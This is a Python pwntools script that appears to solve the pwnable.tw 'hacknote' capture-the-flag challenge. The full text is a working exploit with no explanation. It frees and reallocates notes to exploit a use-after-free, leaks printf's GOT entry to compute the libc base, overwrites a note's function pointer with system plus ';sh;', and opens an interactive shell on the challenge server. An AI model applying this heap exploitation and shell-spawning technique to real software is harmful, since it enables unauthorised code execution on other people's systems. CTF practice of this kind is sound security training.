from pwn import *

put_some_fuck_addr = 0x0804862B
printf_got = 0x0804A010
puts_got = 0x0804A024

def lanuch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    print ('pid:'+str(proc.pidof(p)[0]))
    gdb.attach(proc.pidof(p)[0], execute='b *0x0804893D\nb *0x08048646')

def add_note(n,send):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(n)
    p.recvuntil('Content :')
    p.send(send)

def delete_note(n):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(n)

def print_note(n):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    #lanuch_gdb()
    p.sendline(n)
    return p.recv(4)


#p = process(['/home/etenal/pwnable.tw/hacknote/hacknote'])
p = remote('chall.pwnable.tw', 10102)
elf = ELF('/home/etenal/pwnable.tw/hacknote/libc_32.so.6')

add_note('16','A'*16)
add_note('16','A'*16)
delete_note('0')
delete_note('1')
add_note('8',p32(put_some_fuck_addr)+p32(printf_got))
printf_addr = int(print_note('0')[::-1].encode('hex'),16)

#calc addr of important functions and string
libc_base = printf_addr - elf.symbols['printf']
system_addr = libc_base + elf.symbols['system']
binsh_addr = libc_base + next(elf.search('/bin/sh'))
print (hex(binsh_addr))
#lanuch_gdb()
delete_note('2')
add_note('8',p32(system_addr)+';sh;')
#print_note('0')
p.sendline('3')
p.sendline('0')
p.interactive()
